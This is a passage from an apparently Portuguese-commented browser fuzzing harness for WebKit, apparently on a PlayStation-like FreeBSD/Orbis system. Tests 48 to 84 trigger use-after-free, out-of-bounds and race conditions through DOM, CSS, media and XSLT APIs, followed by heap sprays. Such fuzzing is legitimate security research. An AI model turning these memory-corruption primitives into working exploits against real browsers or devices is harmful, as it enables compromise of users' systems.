                range.surroundContents(wrapper);
                
                // Remove o wrapper recém-inserido da árvore
                wrapper.remove();
                
                // Tenta inserir um nó usando o Range corrompido
                range.insertNode(document.createElement("i"));
            } catch(e) {}
            logMsg("Fim do Teste 48.");
        }

        // Teste 49: HTMLTrackElement Event UAF
        // Elementos de mídia carregam recursos assincronamente. Destruir a tag <track>
        // no exato momento em que ela despacha um evento de erro pode causar falhas no
        // ciclo de vida do objeto no backend.
        function test49() {
            logMsg("Iniciando Teste 49 (Track Event UAF)...");
            try {
                let video = document.createElement("video");
                let track = document.createElement("track");
                
                // Aponta para algo inválido para forçar o evento 'error' o mais rápido possível
                track.src = "invalid_fuzz_url_" + Math.random(); 
                video.appendChild(track);
                document.body.appendChild(video);
                
                track.addEventListener("error", function() {
                    // O motor C++ está executando o callback do evento, destruímos o emissor
                    track.remove();
                    video.remove();
                    
                    // Spray forçado
                    let spray = new Array(5000).fill(new String("A").repeat(256));
                });
            } catch(e) {}
            logMsg("Fim do Teste 49.");
        }

        // Teste 50: Template Content AdoptNode Race
        // Templates armazenam nós em um DocumentFragment especial.
        // Adotar um nó desse fragmento para o documento principal e ao mesmo tempo 
        // limpar o template testa o isolamento de memória do parser HTML subjacente.
        function test50() {
            logMsg("Iniciando Teste 50 (Template AdoptNode Race)...");
            try {
                let tpl = document.createElement("template");
                tpl.innerHTML = "<div id='fuzz_target'>Conteudo</div>";
                document.body.appendChild(tpl);
                
                let target = tpl.content.firstChild;
                
                // Adota o nó para o documento principal (mudando o ponteiro do ownerDocument no C++)
                document.adoptNode(target);
                
                // Imediatamente oblitera a árvore interna do template
                tpl.innerHTML = "";
                
                // Tenta acessar e modificar o nó órfão que acabou de ser adotado
                target.appendChild(document.createElement("span"));
            } catch(e) {}
            logMsg("Fim do Teste 50.");
        }
function test51() {
            logMsg("Iniciando Teste 51 (execCommand UAF)...");
            try {
                let div = document.createElement("div");
                div.contentEditable = "true";
                document.body.appendChild(div);
                
                div.focus();
                
                div.addEventListener("DOMNodeInserted", function(e) {
                    // O C++ está no meio da inserção, nós obliteramos a raiz editável
                    div.remove();
                    
                    // Tentamos forçar o Garbage Collector
                    let spray = new Array(2000).fill(new ArrayBuffer(128));
                });
                
                // Dispara o comando de edição rica nativo
                document.execCommand("insertHTML", false, "<b>Fuzz</b>");
            } catch(e) {}
            logMsg("Fim do Teste 51.");
        }

        // Teste 52: Máquina de Estado do Canvas 2D
        // save() e restore() empilham estados nativamente. Modificar o canvas
        // e destruir o elemento enquanto se desempilha o estado rapidamente.
        function test52() {
            logMsg("Iniciando Teste 52 (Canvas State OOB)...");
            try {
                let canvas = document.createElement("canvas");
                let ctx = canvas.getContext("2d");
                
                // Empilha múltiplos estados
                for(let i = 0; i < 50; i++) {
                    ctx.save();
                    ctx.scale(1.1, 1.1);
                }
                
                // Remove o canvas da memória o máximo possível
                canvas = null;
                
                // Tenta restaurar estados de um contexto que está prestes a ser coletado
                for(let i = 0; i < 50; i++) {
                    ctx.restore();
                }
            } catch(e) {}
            logMsg("Fim do Teste 52.");
        }

        // Teste 53: FontFaceSet Promise Race
        // O gerenciamento de fontes tem um backend assíncrono rigoroso.
        // Limpar o set de fontes exatamente quando uma promessa de carregamento
        // está tentando resolver pode vazar a estrutura ou causar Use-After-Free.
        function test53() {
            logMsg("Iniciando Teste 53 (FontFaceSet Race)...");
            try {
                let font = new FontFace("FuzzFont", "local(Arial)");
                document.fonts.add(font);
                
                font.load().then(function() {
                    // Tenta acessar a fonte assim que ela resolve
                    let status = font.status;
                }).catch(e => {});
                
                // Imediatamente limpa o registro de fontes do C++ antes que a microtask execute
                document.fonts.clear();
                
                // O font object agora é um dangling pointer no JS em relação ao WebCore
                font = null; 
            } catch(e) {}
            logMsg("Fim do Teste 53.");
        }

        // Teste 54: Extração de Range com Reentrada Síncrona
        // extractContents() do Range remove e retorna um DocumentFragment.
        // Capturar a remoção via DOMNodeRemoved e mutar o próprio Range causa confusão nos limites.
        function test54() {
            logMsg("Iniciando Teste 54 (Range Extract Reentrancy)...");
            try {
                let parent = document.createElement("div");
                let child1 = document.createElement("span");
                let child2 = document.createElement("span");
                parent.appendChild(child1);
                parent.appendChild(child2);
                document.body.appendChild(parent);
                
                let range = document.createRange();
                range.setStartBefore(child1);
                range.setEndAfter(child2);
                
                parent.addEventListener("DOMNodeRemoved", function(e) {
                    // Quando o C++ estiver extraindo child1, nós alteramos o fim do Range
                    range.setEndBefore(child1);
                    // E destruímos o próprio parent
                    parent.remove();
                });
                
                // Inicia o processo de extração nativa
                let fragment = range.extractContents();
            } catch(e) {}
            logMsg("Fim do Teste 54.");
        }

        // Teste 55: Shadow DOM Manual Slot Assignment UAF
        // A API de slots manuais (slot.assign) recalcula a árvore plana de renderização nativamente.
        // Atribuir nós e em seguida destruir o Shadow Root ou os próprios nós corrompe essa árvore.
        function test55() {
            logMsg("Iniciando Teste 55 (Shadow DOM Slot UAF)...");
            try {
                let host = document.createElement("div");
                document.body.appendChild(host);
                
                // Cria Shadow Root isolado com atribuição manual
                let shadow = host.attachShadow({ mode: "open", slotAssignment: "manual" });
                let slot = document.createElement("slot");
                shadow.appendChild(slot);
                
                let node = document.createElement("p");
                host.appendChild(node);
                
                // O WebCore atrela os ponteiros internamente
                slot.assign(node);
                
                // Quebra a estrutura imediatamente
                node.remove();
                slot.remove();
                
                // Força o motor a tentar acessar os nós atribuídos que agora são lixo
                let leakedNodes = slot.assignedNodes();
            } catch(e) {}
            logMsg("Fim do Teste 55.");
        }
 // Teste 56: Motor XPath e Invalidação de Iterador (UAF)
        // O avaliador XPath cria um conjunto de nós nativo em C++. Se destruirmos
        // nós da árvore DOM enquanto o iterador do XPath tenta percorrê-la, o
        // WebKit pode falhar em atualizar os ponteiros internos da lista de resultados.
        function test56() {
            logMsg("Iniciando Teste 56 (XPath UAF)...");
            try {
                let div = document.createElement("div");
                let span1 = document.createElement("span");
                let span2 = document.createElement("span");
                div.appendChild(span1);
                div.appendChild(span2);
                document.body.appendChild(div);
                
                // Avalia e cria a lista de nós iteráveis no backend
                let result = document.evaluate("//span", document, null, XPathResult.ORDERED_NODE_ITERATOR_TYPE, null);
                
                // O motor C++ fixa o primeiro nó
                let first = result.iterateNext();
                
                // Destrói os nós da árvore, liberando a memória alocada para eles
                div.innerHTML = "";
                
                // Força um spray rápido de memória para tentar preencher o buraco deixado pelo span2
                let spray = new Array(2000).fill(new ArrayBuffer(128));
                
                // O iterador tenta acessar o próximo nó da lista C++ pré-computada, que agora é lixo
                let leakedNode = result.iterateNext();
            } catch(e) {}
            logMsg("Fim do Teste 56.");
        }

        // Teste 57: HTMLOptionsCollection Length OOB
        // O array de options de um select é mapeado diretamente para as estruturas DOM internas.
        // Truncar o tamanho (length) da coleção e manipular o DOM sincronicamente confunde
        // os limites (Out-of-Bounds) do array no WebCore.
        function test57() {
            logMsg("Iniciando Teste 57 (Options Collection OOB)...");
            try {
                let select = document.createElement("select");
                select.appendChild(document.createElement("option"));
                select.appendChild(document.createElement("option"));
                select.appendChild(document.createElement("option"));
                document.body.appendChild(select);
                
                let optionsList = select.options;
                
                // Salva a referência para a última opção
                let lastOption = optionsList[2];
                
                // Trunca o array nativamente pelo setter do length
                optionsList.length = 1;
                
                // Remove o container do DOM principal
                select.remove();
                
                // Tentativa de leitura na estrutura modificada e possivelmente corrompida
                let leak = lastOption.text;
                let outOfBoundsAccess = optionsList[1];
            } catch(e) {}
            logMsg("Fim do Teste 57.");
        }

        // Teste 58: TextDecoder com Buffer Desanexado (Race/UAF)
        // A API de streamings de texto (TextDecoder) precisa bloquear a memória enquanto lê.
        // Transferir a propriedade do ArrayBuffer (desanexar) no meio do processo pode 
        // fazer o decodificador C++ ler de uma página de memória recém-liberada.
        function test58() {
            logMsg("Iniciando Teste 58 (TextDecoder Detached Buffer)...");
            try {
                let buffer = new ArrayBuffer(1024 * 1024); // 1MB
                let decoder = new TextDecoder();
                
                let channel = new MessageChannel();
                
                // Inicia uma decodificação em streaming
                decoder.decode(buffer, { stream: true });
                
                // Transfere o buffer agressivamente para desanexá-lo da thread principal
                channel.port1.postMessage(buffer, [buffer]);
                
                // Força a leitura do restante do stream em um buffer que agora não pertence mais a este contexto
                decoder.decode(new Uint8Array(0)); 
            } catch(e) {}
            logMsg("Fim do Teste 58.");
        }

        // Teste 59: DOMMatrix Getter/valueOf Mutation
        // As APIs matemáticas como DOMMatrix processam arrays de números rapidamente no backend.
        // Injetar um objeto com 'valueOf' personalizado força o C++ a pausar e rodar JavaScript.
        // Mutar os arrays originais durante essa pausa resulta em Type Confusion ou OOB.
        function test59() {
            logMsg("Iniciando Teste 59 (DOMMatrix Getter Mutation)...");
            try {
                let arr = [1, 2, 3, 4, 5, 6];
                
                // Sobrescrevemos o índice 5 com um objeto perigoso
                arr[5] = {
                    valueOf: function() {
                        // Enquanto o construtor do DOMMatrix está lendo os valores, nós esvaziamos a matriz base
                        arr.length = 0;
                        
                        // Enchemos a memória de volta com dados falsos
                        let spray = new Array(1000).fill(0x1337);
                        return 6;
                    }
                };
                
                // A invocação força o C++ a iterar sobre os 6 itens. Ao chegar no 6º, nosso JS dispara.
                let matrix = new DOMMatrix(arr);
            } catch(e) {}
            logMsg("Fim do Teste 59.");
        }

        // Teste 60: Reentrância de Promise em Mídia
        // Métodos de mídia como play() retornam uma Promise e enfileiram tarefas assíncronas no motor.
        // Destruir o elemento de mídia antes da resolução pode vazar os manipuladores nativos da Promise.
        function test60() {
            logMsg("Iniciando Teste 60 (Media Promise Reentrancy)...");
            try {
                let video = document.createElement("video");
                video.src = "invalid_fuzz_media_" + Math.random();
                document.body.appendChild(video);
                
                // play() inicia operações assíncronas no backend de mídia do FreeBSD/Orbis OS
                let playPromise = video.play();
                
                if (playPromise !== undefined) {
                    playPromise.then(() => {}).catch(e => {
                        // Callback manipulador. Tenta acessar a árvore após a falha/destruição
                        let leak = video.currentTime;
                    });
                }
                
                // Puxa o tapete imediatamente da estrutura C++
                video.remove();
                video = null;
                
                // Spray no fastMalloc
                let spray = new Array(10000).fill("A".repeat(128));
            } catch(e) {}
            logMsg("Fim do Teste 60.");
        }
// Teste 61: XSLTProcessor Transformation UAF
        // O processador XSLT compila planilhas de estilo nativamente e transforma XMLs.
        // Destruir os documentos originais no momento da transformação deixa o motor C++ cego.
        function test61() {
            logMsg("Iniciando Teste 61 (XSLTProcessor UAF)...");
            try {
                let xsltStr = `<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><fuzz/></xsl:template></xsl:stylesheet>`;
                let xmlStr = `<root><data>1</data></root>`;
                
                let parser = new DOMParser();
                let xsltDoc = parser.parseFromString(xsltStr, "text/xml");
                let xmlDoc = parser.parseFromString(xmlStr, "text/xml");
                
                let processor = new XSLTProcessor();
                processor.importStylesheet(xsltDoc);
                
                // Quebramos as referências originais do JS
                xsltDoc = null;
                xmlDoc = null;
                
                // Força o C++ a transformar um documento que está sendo processado pelo Garbage Collector
                let resultFragment = processor.transformToFragment(parser.parseFromString(xmlStr, "text/xml"), document);
            } catch(e) {}
            logMsg("Fim do Teste 61.");
        }

        // Teste 62: ResizeObserver Layout Race
        // O ResizeObserver entrega notificações de mudança de layout do C++ para o JS.
        // Se, durante o callback, nós desconectarmos o observer e destruirmos o nó,
        // o motor de layout do WebKit pode tentar acessar ponteiros fantasmas no próximo frame de renderização.
        function test62() {
            logMsg("Iniciando Teste 62 (ResizeObserver Race)...");
            try {
                let div = document.createElement("div");
                div.style.width = "100px";
                document.body.appendChild(div);
                
                let observer = new ResizeObserver((entries) => {
                    // Durante a entrega assíncrona, interrompemos a máquina de estado
                    observer.disconnect();
                    div.remove();
                    
                    // Spray na memória do layout recém-liberado
                    let spray = new Array(5000).fill(new String("A").repeat(200));
                });
                
                observer.observe(div);
                
                // Força a mudança síncrona para acionar o observer no backend
                div.style.width = "200px";
            } catch(e) {}
            logMsg("Fim do Teste 62.");
        }

        // Teste 63: Bidi Text Layout OOB (Bidirectional)
        // O motor de renderização de fontes lida com textos RTL (Right-to-Left) via algoritmos complexos.
        // Inverter a direção da árvore isolada enquanto deletamos nós de texto confunde os 
        // delimitadores da string nativa no C++, frequentemente resultando em leituras fora dos limites (OOB).
        function test63() {
            logMsg("Iniciando Teste 63 (Bidi Text Layout OOB)...");
            try {
                let bdo = document.createElement("bdo");
                bdo.dir = "rtl";
                let text = document.createTextNode("fuzzing_bidi_text_memory");
                bdo.appendChild(text);
                document.body.appendChild(bdo);
                
                // Força o cálculo de layout em modo RTL
                let forceLayout = bdo.offsetWidth;
                
                // Inverte bruscamente a direção e oblitera o nó de texto base
                bdo.dir = "ltr";
                text.remove();
                
                // O motor vai tentar re-renderizar a transição com um ponteiro de texto que já não existe
            } catch(e) {}
            logMsg("Fim do Teste 63.");
        }

        // Teste 64: WebSocket Buffered Amount UAF
        // Enviar grandes volumes de dados (ArrayBuffer) pelo WebSocket força o WebKit a enfileirar
        // os dados na thread de rede subjacente (FreeBSD sockets).
        // Destruir o objeto localmente antes do buffer ser drenado pode causar falha de liberação dupla (Double Free).
        function test64() {
            logMsg("Iniciando Teste 64 (WebSocket Race)...");
            try {
                let ws = new WebSocket("ws://127.0.0.1:1337"); // Tentativa local/dummy
                
                // Payload massivo para preencher o buffer nativo do sistema
                let payload = new ArrayBuffer(1024 * 1024 * 5); // 5MB
                
                ws.onopen = function() {
                    ws.send(payload);
                    // Oblitera a instância logo após ordenar o envio assíncrono
                    ws.close();
                    ws = null;
                };
                
                // Tenta enviar diretamente antes de conectar (força o enfileiramento cego do WebKit)
                ws.send(payload);
                ws.close();
                ws = null;
            } catch(e) {}
            logMsg("Fim do Teste 64.");
        }

        // Teste 65: Fragment TreeWalker Entanglement
        // DocumentFragments são "nós fantasmas" no DOM. Adicionar um fragmento ao documento
        // transfere todos os seus filhos nativamente e esvazia o fragmento instantaneamente.
        // Se um TreeWalker estiver iterando o fragmento no exato momento da transferência, ele perde o chão.
        function test65() {
            logMsg("Iniciando Teste 65 (Fragment TreeWalker)...");
            try {
                let frag = document.createDocumentFragment();
                let span1 = document.createElement("span");
                let span2 = document.createElement("span");
                frag.appendChild(span1);
                frag.appendChild(span2);
                
                let walker = document.createTreeWalker(frag, NodeFilter.SHOW_ELEMENT);
                walker.nextNode(); // Ocultamente aponta o iterador C++ para span1 no fragmento
                
                // Anexa o fragmento ao corpo. O WebCore move os filhos e esvazia o 'frag' nativamente
                document.body.appendChild(frag);
                
                // O fragmento agora está vazio. O walker deveria falhar com segurança, mas...
                let leakedNode = walker.nextNode(); // Pode tentar acessar lixo de memória
            } catch(e) {}
            logMsg("Fim do Teste 65.");
        }
// Teste 66: Object Fallback Rendering UAF
        // Se a tag <object> falha ao carregar o 'data', o WebCore renderiza os filhos (fallback).
        // Destruir o objeto no exato evento de erro confunde a transição do motor de layout.
        function test66() {
            logMsg("Iniciando Teste 66 (Object Fallback UAF)...");
            try {
                let obj = document.createElement("object");
                obj.data = "invalid_fuzz_data://1337";
                
                let fallbackText = document.createTextNode("Fallback Content");
                obj.appendChild(fallbackText);
                document.body.appendChild(obj);
                
                obj.addEventListener("error", function() {
                    // O C++ vai tentar renderizar o 'fallbackText', mas nós destruímos o contêiner
                    obj.remove();
                    
                    // Spray no heap para tentar ocupar a estrutura do fallback no fastMalloc
                    let spray = new Array(3000).fill(new String("A").repeat(128));
                });
            } catch(e) {}
            logMsg("Fim do Teste 66.");
        }

        // Teste 67: Focus/Blur Synchronous Destruction
        // Transições de foco chamam rotinas pesadas no FocusController em C++.
        // Engatilhar blur e focus recursivamente enquanto deletamos os elementos alvo
        // cria um labirinto de ponteiros fantasmas.
        function test67() {
            logMsg("Iniciando Teste 67 (Focus/Blur Race)...");
            try {
                let input1 = document.createElement("input");
                let input2 = document.createElement("input");
                document.body.appendChild(input1);
                document.body.appendChild(input2);
                
                input1.focus();
                
                input1.addEventListener("blur", function() {
                    input2.focus(); // Força o foco no segundo
                });
                
                input2.addEventListener("focus", function() {
                    // Durante a conclusão da transição nativa, apagamos o primeiro nó
                    input1.remove();
                });
                
                // Gatilho: força o input1 a perder o foco
                input1.blur();
            } catch(e) {}
            logMsg("Fim do Teste 67.");
        }

        // Teste 68: SplitText e Range Out-of-Bounds
        // splitText() divide o nó nativamente e atualiza automaticamente os limites 
        // de qualquer objeto Range que estiver cobrindo aquele texto.
        function test68() {
            logMsg("Iniciando Teste 68 (SplitText Range OOB)...");
            try {
                let textNode = document.createTextNode("FuzzingWebCore");
                document.body.appendChild(textNode);
                
                let range = document.createRange();
                range.selectNodeContents(textNode);
                
                // O WebCore divide o texto em dois nós distintos no backend
                let secondHalf = textNode.splitText(7);
                
                // Imediatamente destruímos a segunda metade
                secondHalf.remove();
                
                // O Range tenta ler ou extrair de um limite que foi alterado e em seguida liberado
                let leak = range.cloneContents();
            } catch(e) {}
            logMsg("Fim do Teste 68.");
        }

        // Teste 69: Image Decode Promise UAF
        // A função decode() delega o parseamento da imagem para uma thread assíncrona
        // e retorna uma Promise. Abortar a imagem no processo pode vazar a callback.
        function test69() {
            logMsg("Iniciando Teste 69 (Image Decode Promise)...");
            try {
                let img = new Image();
                // SVG aninhado complexo para atrasar o parser gráfico nativo
                img.src = "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><circle r='50'/></svg>";
                
                img.decode().then(() => {
                    // Se a promessa resolver em um objeto zumbi, este código roda no limbo
                    let width = img.width;
                }).catch(() => {});
                
                // Apaga a fonte e a referência enquanto o C++ decodifica em segundo plano
                img.src = "";
                img = null;
                
                // Spray massivo
                let spray = new Array(10000).fill(new ArrayBuffer(64));
            } catch(e) {}
            logMsg("Fim do Teste 69.");
        }

        // Teste 70: Event Path Amputation (Fase de Captura)
        // O WebCore constrói um vetor (Event Path) com todos os nós do caminho do evento.
        // Interceptar o evento na fase de captura (descendo a árvore) e destruir
        // o alvo antes do evento chegar lá resulta em Out-of-Bounds no vetor nativo.
        function test70() {
            logMsg("Iniciando Teste 70 (Event Path Amputation)...");
            try {
                let parent = document.createElement("div");
                let target = document.createElement("span");
                parent.appendChild(target);
                document.body.appendChild(parent);
                
                // Listener na fase de captura (true) no nó pai
                parent.addEventListener("click", function() {
                    // O motor C++ ainda vai tentar despachar o evento para o 'target' no próximo passo
                    parent.innerHTML = ""; // Destrói o target
                }, true); 
                
                // Dispara o evento de baixo para cima
                target.click();
            } catch(e) {}
            logMsg("Fim do Teste 70.");
        }
// Teste 71: Invalidação de Iterador CSS (Análogo CVE-2026-2441)
        // O motor CSS entra em um loop para ler coleções de regras.
        // Se deletarmos as folhas de estilo ativas durante o recálculo, o ponteiro de iteração
        // pode ser silenciosamente invalidado, acessando memória liberada no heap.
        function test71() {
            logMsg("Iniciando Teste 71 (CSS Iterator Race)...");
            try {
                let style = document.createElement("style");
                document.head.appendChild(style);
                
                // Popula a folha de estilo para forçar iteração nativa
                for(let i = 0; i < 50; i++) {
                    style.sheet.insertRule(`.fuzz${i} { color: red; }`, i);
                }
                
                let div = document.createElement("div");
                div.className = "fuzz25"; // Força o WebCore a buscar a regra
                document.body.appendChild(div);
                
                // No momento em que pedimos o layout, destruímos o contêiner das regras
                let forceLayout = div.offsetHeight;
                style.remove();
                
                // Spray no Heap do WebCore
                let spray = new Array(2000).fill(new String("CSS_UAF").repeat(128));
            } catch(e) {}
            logMsg("Fim do Teste 71.");
        }

        // Teste 72: Evento Recursivo Profundo
        // Despachar eventos a partir do próprio callback de evento cria uma pilha profunda no C++.
        // Remover o alvo no final da pilha confunde o retorno (unwinding) do EventDispatcher nativo.
        function test72() {
            logMsg("Iniciando Teste 72 (Recursive Events)...");
            try {
                let target = document.createElement("div");
                document.body.appendChild(target);
                
                let depth = 0;
                target.addEventListener("fuzzEvent", function(e) {
                    depth++;
                    if (depth < 50) {
                        // Despacha recursivamente
                        target.dispatchEvent(new Event("fuzzEvent"));
                    } else {
                        // Na profundidade máxima, amputamos o alvo da memória
                        target.remove();
                    }
                });
                
                target.dispatchEvent(new Event("fuzzEvent"));
            } catch(e) {}
            logMsg("Fim do Teste 72.");
        }

        // Teste 73: Coleta de Lixo em Documento Isolado (DOMato Logic)
        // Cria um documento sem janela (isolado), cria nós complexos nele e inicia a importação
        // para o documento principal, obliterando o documento de origem no processo.
        function test73() {
            logMsg("Iniciando Teste 73 (Isolated Document UAF)...");
            try {
                let isolatedDoc = document.implementation.createHTMLDocument("Isolated");
                let complexNode = isolatedDoc.createElement("table");
                complexNode.appendChild(isolatedDoc.createElement("tbody"));
                isolatedDoc.body.appendChild(complexNode);
                
                // Prepara a importação do nó
                let importedNode = document.importNode(complexNode, true);
                
                // Esvazia as referências do documento isolado
                isolatedDoc.body.innerHTML = "";
                isolatedDoc = null;
                
                // Tenta inserir o nó importado que pode ter ponteiros C++ pendentes do documento morto
                document.body.appendChild(importedNode);
            } catch(e) {}
            logMsg("Fim do Teste 73.");
        }

        // Teste 74: Recálculo Síncrono de Estilo (UAF)
        // getComputedStyle força o WebKit a atualizar a árvore de renderização na hora.
        // Passar um nó que foi removido e não possui mais contexto válido testa os limites da engine CSS.
        function test74() {
            logMsg("Iniciando Teste 74 (Sync Style UAF)...");
            try {
                let span = document.createElement("span");
                span.style.display = "block";
                document.body.appendChild(span);
                
                // Removemos o elemento da árvore ativa
                span.remove();
                
                // Forçamos o cálculo complexo em um nó órfão
                let computed = window.getComputedStyle(span);
                let leakColor = computed.color;
            } catch(e) {}
            logMsg("Fim do Teste 74.");
        }

        // Teste 75: XMLSerializer e Mutação Síncrona
        // O XMLSerializer varre a árvore em C++ para construir uma string.
        // Injetar um nó com um getter que altera a árvore sob os pés do serializador causa Out-of-Bounds.
        function test75() {
            logMsg("Iniciando Teste 75 (XMLSerializer Mutating Race)...");
            try {
                let serializer = new XMLSerializer();
                let root = document.createElement("div");
                let child1 = document.createElement("span");
                let child2 = document.createElement("b");
                root.appendChild(child1);
                root.appendChild(child2);
                
                // Definimos uma mutação oculta
                Object.defineProperty(child1, 'nodeName', {
                    get: function() {
                        // Enquanto o serializador lê o child1, apagamos o child2
                        child2.remove();
                        return "SPAN";
                    }
                });
                
                // Dispara a varredura nativa
                let xmlString = serializer.serializeToString(root);
            } catch(e) {}
            logMsg("Fim do Teste 75.");
        }

        // Teste 76: SVG <use> Shadow Tree UAF
        // O elemento <use> constrói uma "shadow tree" oculta no C++ baseada no elemento referenciado.
        // Mudar a referência e destruir o alvo enquanto a árvore oculta é construída causa UAF.
        function test76() {
            logMsg("Iniciando Teste 76 (SVG Use Shadow Tree)...");
            try {
                let svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
                let g = document.createElementNS("http://www.w3.org/2000/svg", "g");
                g.id = "targetNode";
                let use = document.createElementNS("http://www.w3.org/2000/svg", "use");
                
                svg.appendChild(g);
                svg.appendChild(use);
                document.body.appendChild(svg);
                
                // Aponta o <use> para o grupo, forçando a criação da shadow tree nativa
                use.setAttribute("href", "#targetNode");
                
                // Imediatamente alteramos o ID e destruímos o nó original
                g.id = "changed";
                g.remove();
                
                // Spray no Heap para corromper a shadow tree que ficou órfã no backend
                let spray = new Array(2000).fill(new String("SVG_UAF").repeat(128));
            } catch(e) {}
            logMsg("Fim do Teste 76.");
        }

        // Teste 77: Custom Element Upgrade Race
        // Quando um elemento existente é definido (upgraded), o construtor é chamado sincronicamente.
        // Se o construtor remover o próprio elemento da árvore DOM ou alterar sua estrutura, 
        // a máquina de estado do WebCore entra em colapso.
        function test77() {
            logMsg("Iniciando Teste 77 (Custom Element Upgrade)...");
            try {
                let el = document.createElement("fuzz-tag");
                document.body.appendChild(el);
                
                class FuzzElement extends HTMLElement {
                    constructor() {
                        super();
                        // O C++ está no meio do processo de upgrade, e nós deletamos o nó base
                        this.remove();
                    }
                }
                
                // O método define() engatilha o upgrade síncrono do elemento já presente na página
                customElements.define("fuzz-tag", FuzzElement);
            } catch(e) {}
            logMsg("Fim do Teste 77.");
        }

        // Teste 78: PostMessage Transfer Array Getter
        // A transferência de objetos (como MessagePorts) lê o array passado.
        // Injetar um getter nesse array faz o interpretador pausar a transferência nativa 
        // para rodar JS, permitindo fechar ou corromper a porta antes que o C++ assuma o controle.
        function test78() {
            logMsg("Iniciando Teste 78 (Transfer Array Getter)...");
            try {
                let channel = new MessageChannel();
                let port = channel.port1;
                
                // Criamos um array manipulado
                let transferList = [];
                Object.defineProperty(transferList, '0', {
                    get: function() {
                        // Fechamos a porta enquanto o serializador está lendo o array
                        port.close();
                        
                        // Spray rápido
                        new ArrayBuffer(1024);
                        return port;
                    }
                });
                transferList.length = 1; // Engana o verificador de tamanho nativo
                
                window.postMessage("fuzz", "*", transferList);
            } catch(e) {}
            logMsg("Fim do Teste 78.");
        }

        // Teste 79: Table InsertRow Mutation
        // As tabelas mantêm ponteiros estritos para THead, TBody, etc.
        // insertRow() é uma função nativa. Se dispararmos um evento DOMNodeInserted durante a inserção
        // e usarmos esse evento para destruir o corpo da tabela, o C++ vai tentar inserir a linha no vazio.
        function test79() {
            logMsg("Iniciando Teste 79 (Table InsertRow Mutation)...");
            try {
                let table = document.createElement("table");
                let tbody = document.createElement("tbody");
                table.appendChild(tbody);
                document.body.appendChild(table);
                
                tbody.addEventListener("DOMNodeInserted", function() {
                    // O C++ acabou de criar a linha, mas ainda precisa anexá-la logicamente. Apagamos o contêiner.
                    table.innerHTML = "";
                });
                
                // Chama a rotina nativa
                tbody.insertRow(0);
            } catch(e) {}
            logMsg("Fim do Teste 79.");
        }

        // Teste 80: CSS Variable Cascade UAF
        // Variáveis CSS (:root) propagam-se para toda a árvore. Alterá-las força um recálculo síncrono (Style Recalc).
        // Capturar o evento de transição ou usar um observer para deletar os nós que estão recebendo
        // a nova cascata de estilos testa os limites dos iteradores do motor CSS.
        function test80() {
            logMsg("Iniciando Teste 80 (CSS Variable Cascade)...");
            try {
                let container = document.createElement("div");
                document.body.appendChild(container);
                
                // Cria uma sub-árvore densa
                for(let i=0; i<100; i++) {
                    let child = document.createElement("span");
                    child.style.color = "var(--fuzz-color)";
                    container.appendChild(child);
                }
                
                // Observamos as mutações para agir assincronamente durante a renderização
                let observer = new MutationObserver(() => {
                    container.remove();
                });
                observer.observe(document.documentElement, { attributes: true });
                
                // Forçamos a cascata de recálculo em todo o documento
                document.documentElement.style.setProperty("--fuzz-color", "red");
                
                // Pedimos o layout para forçar a sincronização C++
                let forceLayout = container.offsetHeight;
            } catch(e) {}
            logMsg("Fim do Teste 80.");
        }
// Teste 81: Pseudo-element Render UAF (::first-letter)
        // O WebCore aloca um RenderTextFragment exclusivo no C++ para o ::first-letter.
        // Alterar o DOM para invalidar esse bloco enquanto forçamos um recálculo de layout
        // pode deixar o RenderTree apontando para uma string destruída.
        function test81() {
            logMsg("Iniciando Teste 81 (Pseudo-element UAF)...");
            try {
                let div = document.createElement("div");
                div.className = "fuzz-first-letter";
                let textNode = document.createTextNode("Fuzzing");
                div.appendChild(textNode);
                document.body.appendChild(div);
                
                // Força o WebCore a construir a RenderTree (incluindo o objeto do ::first-letter)
                let forceRender = div.offsetHeight;
                
                // O método splitText divide o nó nativamente. O ::first-letter fica confuso.
                let secondHalf = textNode.splitText(1);
                
                // Destruímos a segunda metade e a raiz da renderização simultaneamente
                secondHalf.remove();
                div.style.display = "none";
                
                // Spray no Heap
                let spray = new Array(1500).fill(new String("A").repeat(256));
            } catch(e) {}
            logMsg("Fim do Teste 81.");
        }

        // Teste 82: Input Type Mutation Selection OOB
        // Inputs de texto possuem um Shadow DOM oculto. Selecionar o texto prende os ponteiros.
        // Mudar para 'hidden' destrói a árvore visual interna, mas a API de seleção do documento
        // pode ainda tentar iterar sobre esses nós já libertados.
        function test82() {
            logMsg("Iniciando Teste 82 (Input Type Mutation)...");
            try {
                let input = document.createElement("input");
                input.type = "text";
                input.value = "FuzzPayload";
                document.body.appendChild(input);
                
                // Força o foco e cria uma seleção interna nativa
                input.focus();
                input.setSelectionRange(0, 5);
                
                // Muta o tipo brutalmente, o que destrói o RenderTextControl no C++
                input.type = "hidden";
                
                // Tenta extrair dados da seleção que estava atrelada à estrutura destruída
                let sel = window.getSelection();
                let leak = sel.toString();
            } catch(e) {}
            logMsg("Fim do Teste 82.");
        }

        // Teste 83: HTMLPictureElement Source Engine Race
        // A tag <picture> reavalia suas <source> filhas sempre que o viewport ou o DOM mudam.
        // Interceptar essa avaliação síncrona e obliterar as tags <source> corrompe a lógica de fallback.
        function test83() {
            logMsg("Iniciando Teste 83 (Picture Source Race)...");
            try {
                let pic = document.createElement("picture");
                let src1 = document.createElement("source");
                src1.media = "(min-width: 1px)";
                src1.srcset = "invalid_fuzz_1.jpg";
                
                let img = document.createElement("img");
                pic.appendChild(src1);
                pic.appendChild(img);
                document.body.appendChild(pic);
                
                // Observamos as mutações para interromper o C++
                let obs = new MutationObserver(() => {
                    // O C++ tentou reagir à mudança, nós apagamos a fonte
                    src1.remove();
                });
                obs.observe(pic, { childList: true, subtree: true, attributes: true });
                
                // Gatilho: altera a regra de mídia para forçar a reavaliação nativa
                src1.media = "(max-width: 10000px)";
            } catch(e) {}
            logMsg("Fim do Teste 83.");
        }

        // Teste 84: HTMLMarqueeElement Legacy Timer UAF
        // O elemento <marquee> instancia um temporizador (Timer) no backend do WebCore para animar.
        // Iniciar a animação e mover o nó entre documentos falsos desestabiliza o ciclo de vida do Timer.
        function test84() {
            logMsg("Iniciando Teste 84 (Marquee Legacy Timer)...");
            try {
                let marquee = document.createElement("marquee");
                marquee.innerText = "Fuzzing...";
                document.body.appendChild(marquee);
                
                // O temporizador C++ é iniciado
                marquee.start();
                
                // Criamos um documento morto em memória
                let deadDoc = document.implementation.createHTMLDocument("Dead");
                
